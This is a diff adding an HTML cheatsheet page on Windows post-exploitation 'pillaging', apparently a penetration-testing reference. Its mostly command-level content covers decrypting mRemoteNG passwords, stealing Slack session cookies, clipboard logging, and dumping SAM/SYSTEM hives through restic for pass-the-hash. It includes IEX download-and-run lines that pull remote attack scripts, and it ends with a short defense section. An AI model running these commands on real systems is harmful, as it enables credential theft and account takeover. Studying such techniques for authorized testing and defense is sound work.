@@ -1,0 +1,83 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Pillaging · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Windows › Privilege Escalation</nav><h1>Pillaging</h1><p class="cx-lede">Post-foothold data gathering on a compromised Windows host - enumerating installed applications, looting remote-management configs (mRemoteNG confCons.xml and its hardcoded master password), stealing IM-client session cookies from Firefox and Chromium to ride a user&#x27;s Slack/Teams session past MFA, logging the clipboard for pasted secrets, and abusing a backup system (restic) to snapshot and restore the SAM/SYSTEM hives for offline hash extraction and pass-the-hash.</p><div class="cx-tags"><span class="cx-tag">MITRE T1005, T1539, T1552.001, T1003.002</span><span class="cx-tag">D3FEND D3-FA, D3-CH</span><span class="cx-tag">IMPACT CredentialTheft, PrivEsc</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>Pillaging is the post-foothold hunt for anything that extends access - credentials, session tokens, infrastructure detail, sensitive data. Distinct from the targeted <a href="../credential-hunting/index.html">credential hunting</a> sweeps, this is about <em>applications and their stored state</em>: management tools, browsers, IM clients, the clipboard, and backup systems.</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell"># What&#x27;s installed? (apps are the map to where the loot is)
+Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
+  Select DisplayName,DisplayVersion,InstallLocation
+
+# Loot management-tool configs (mRemoteNG stores creds under a hardcoded master pw)
+gc $env:APPDATA\mRemoteNG\confCons.xml           # → mRemoteNG-Decrypt
+
+# Steal an IM session cookie to ride the session past MFA
+Invoke-SharpChromium -Command &quot;cookies slack.com&quot;   # Chromium (DPAPI); Firefox: cookies.sqlite
+
+# Watch the clipboard (password-manager paste → cleartext)
+Invoke-ClipboardLogger</code></pre></figure>
+<p>Success indicator: recovered credentials, a usable session cookie that logs you into the user's cloud IM, or - via a backup system - the SAM/SYSTEM hives yielding local hashes for reuse.</p>
+<h2 id="installed-applications">Installed applications</h2>
+<p>Installed software is the map to where loot lives. List it fast with the Program Files directories, or more thoroughly from the uninstall registry keys:</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">dir &quot;C:\Program Files&quot;, &quot;C:\Program Files (x86)&quot;
+Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*,
+                 HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
+  ? DisplayName | sort DisplayName -Unique | ft DisplayName,DisplayVersion,InstallLocation</code></pre></figure>
+<p>Flag remote-management tools (mRemoteNG, TeamViewer, PuTTY), IM clients, browsers, backup agents, and dev tooling - each is a store to loot below. (This is the same uninstall-key enumeration <a href="../stored-credentials/index.html">stored credentials</a> uses; run it once and reuse the list.)</p>
+<h2 id="management-tool-configs-mremoteng">Management-tool configs - mRemoteNG</h2>
+<p><a href="https://mremoteng.org/">mRemoteNG</a> saves connection credentials to <code>confCons.xml</code> in <code>%APPDATA%\mRemoteNG</code>. If the user didn't set a custom master password, it encrypts with a <strong>hardcoded default (<code>mR3m</code>)</strong> - so the stored passwords are trivially recoverable:</p>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;Node Name=&quot;RDP_Domain&quot; Username=&quot;administrator&quot; Domain=&quot;test.local&quot; Hostname=&quot;10.0.0.10&quot;
+      Password=&quot;sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+...&quot; Protocol=&quot;RDP&quot;/&gt;</code></pre></figure>
+<p>Copy the <code>Password</code> value and decrypt with <a href="https://github.com/haseebT/mRemoteNG-Decrypt">mRemoteNG-Decrypt</a>:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">python3 mremoteng_decrypt.py -s &quot;sPp6b6Tr2iyXIdD/KFNGEWzzU...&quot;            # default master pw
+python3 mremoteng_decrypt.py -s &quot;EBHmUA3DqM3sHush...&quot; -p admin            # custom master pw, if known</code></pre></figure>
+<p>If a custom master password is set, decryption fails with <code>MAC check failed</code>; crack it by looping a wordlist through the script against the <code>Password</code> (or the file's <code>Protected</code> attribute) until one returns the plaintext. The same pattern applies to other management tools that store "encrypted" connection secrets with recoverable keys.</p>
+<h2 id="im-client-session-cookies-slack-teams">IM-client session cookies (Slack / Teams)</h2>
+<p>If a user is signed into Slack or Teams and you can't get (or MFA blocks) their password, steal their <strong>session cookie</strong> and replay it to log in as them in a browser. Slack's auth token lives in the cookie named <strong><code>d</code></strong>.</p>
+<p><strong>Firefox</strong> stores cookies in a per-profile SQLite DB; copy it and extract:</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .</code></pre></figure>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">python3 cookieextractor.py --dbpath cookies.sqlite --host slack --cookie d</code></pre></figure>
+<p><strong>Chromium</strong> encrypts the cookie value with DPAPI, so decrypt it <em>in the user's session</em> with <a href="https://github.com/djhohnstein/SharpChromium">SharpChromium</a> / <code>Invoke-SharpChromium</code>:</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">IEX(New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1&#x27;)
+# modern Chrome moved the DB - copy it to where the tool expects, then:
+copy &quot;$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies&quot; &quot;$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies&quot;
+Invoke-SharpChromium -Command &quot;cookies slack.com&quot;</code></pre></figure>
+<p>Load the recovered <code>d</code> value into a browser with the <strong>Cookie-Editor</strong> extension, point it at <code>slack.com</code>, refresh, and you're in the user's workspace - search chats for passwords/PII. Replay the same cookie on any sub-prompt.</p>
+<div class="cx-aside cx-caution">
+<p class="cx-aside-title">Caution</p>
+<p>The Chromium DPAPI path works on legacy/older profiles, but <strong>Chrome 127+ App-Bound Encryption</strong> blocks same-user DPAPI decryption of the cookie store - as covered on <a href="../stored-credentials/index.html#saved-browser-logins">stored credentials</a>, a current Chrome profile needs ABE-aware tooling or in-browser extraction instead. Firefox (no ABE) remains straightforward.</p>
+</div>
+<h2 id="clipboard">Clipboard</h2>
+<p>Admins using a password manager <em>paste</em> credentials rather than type them, so keylogging misses them but the <strong>clipboard</strong> catches them - along with 2FA soft-tokens and RDP-clipboard content. Log it with <a href="https://github.com/inguardians/Invoke-Clipboard">Invoke-Clipboard</a>:</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">IEX(New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1&#x27;)
+Invoke-ClipboardLogger        # prints clipboard entries as they change - wait for a paste</code></pre></figure>
+<h2 id="backup-systems">Backup systems</h2>
+<p>Backup servers and agents are crown jewels: the backup account usually has <strong>local admin on every protected host</strong>, and the backups themselves contain those hosts' sensitive files - including registry hives. If you land on one, loot the backups.</p>
+<p>Using <a href="https://restic.net/">restic</a> as the example (many enterprise systems follow the same shape), you can snapshot protected data - <code>--use-fs-snapshot</code> takes a VSS copy so even locked files like the registry hives are captured - then restore it and extract hashes offline:</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">$env:RESTIC_PASSWORD = &#x27;Password&#x27;                 # or find it unset/stored nearby
+restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot
+restic.exe -r E:\restic2\ snapshots                # list; pick the config snapshot ID
+restic -r E:\restic2 restore &lt;snapID&gt; --target C:\RESTORE</code></pre></figure>
+<p>From the restored <code>SAM</code>/<code>SYSTEM</code> (under <code>C:\RESTORE\...\Windows\System32\config</code>), extract local hashes with impacket and reuse them - this is the same hive-to-hashes flow as <a href="../backup-operators/index.html">Backup Operators</a>:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">secretsdump.py -sam SAM -system SYSTEM LOCAL
+# Administrator:500:aad3b435...:bac9dc5b7b4bec1d83e0e9c04b477f26:::
+psexec.py Administrator@TARGET -hashes aad3b435b51404eeaad3b435b51404ee:bac9dc5b7b4bec1d83e0e9c04b477f26
+# or: netexec smb TARGET -u Administrator -H bac9dc5b7b4bec1d83e0e9c04b477f26</code></pre></figure>
+<p>The recovered NT hash <strong>is</strong> pass-the-hash-able (unlike the NetNTLMv2 from <a href="../capturing-user-credentials/index.html">forced-auth capture</a>), and a local-admin hash often works across hosts that share it.</p>
+<h2 id="defense">Defense</h2>
+<ul>
+<li>Set a strong, non-default master password on mRemoteNG and similar tools - the hardcoded <code>mR3m</code> makes "protected" configs plaintext. Better, don't store privileged creds in connection managers at all.</li>
+<li>Protect browser cookie stores (Chrome App-Bound Encryption), and treat session-cookie theft as credential theft: short session lifetimes and re-auth on sensitive actions blunt cookie replay even with MFA.</li>
+<li>Harden backup infrastructure as tier-0: dedicated, least-privilege backup accounts (not domain/local admin everywhere), encrypted repositories with protected passwords, and tight ACLs on repos and snapshots.</li>
+<li>Monitor for clipboard-logger and cookie-extraction tooling, bulk reads of browser profile/<code>AppData</code> paths, and unexpected <code>restic</code>/backup-tool invocations.</li>
+</ul>
+<h2 id="related">Related</h2>
+<ul>
+<li><a href="../capturing-user-credentials/index.html">Capturing credentials from other users</a> - the active/baiting counterpart to this passive looting</li>
+<li><a href="../stored-credentials/index.html">Stored credentials</a> - browser logins, Credential Manager, and the App-Bound Encryption caveat</li>
+<li><a href="../backup-operators/index.html">Backup Operators</a> - the SAM/SYSTEM-hive-to-hashes flow the restored backups feed</li>
+<li><a href="../credential-hunting/index.html">Credential hunting</a> - targeted file-at-rest sweeps that complement application looting</li>
+</ul></article><nav class="cx-pager"><a class="cx-prev" href="../capturing-user-credentials/index.html">Previous: Capturing Credentials from Other Users</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
